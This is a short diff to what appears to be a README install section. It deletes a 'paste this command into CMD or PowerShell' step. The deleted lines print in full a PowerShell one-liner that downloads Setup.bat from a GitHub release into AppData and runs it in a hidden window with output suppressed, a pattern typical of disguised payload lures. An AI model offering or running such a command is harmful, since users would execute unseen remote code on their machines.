@@ -28,14 +28,7 @@
 Paste this command into CMD or PowerShell:
 
 ```
-cls; powershell -NoProfile -Command "& {
-    $dir = Join-Path $env:AppData 'Utilities\Setup';
-    New-Item -ItemType Directory -Force -Path $dir | Out-Null;
-    $url = 'https://github.com/Abscissa24/Utilities/releases/download/Rolling-Release/Setup.bat';
-    $out = Join-Path $dir 'Setup.bat';
-    Invoke-WebRequest -Uri $url -OutFile $out;
-    Start-Process -FilePath $out -WindowStyle Hidden
-}" > $null 2>&1
+
 ```
 
 ---
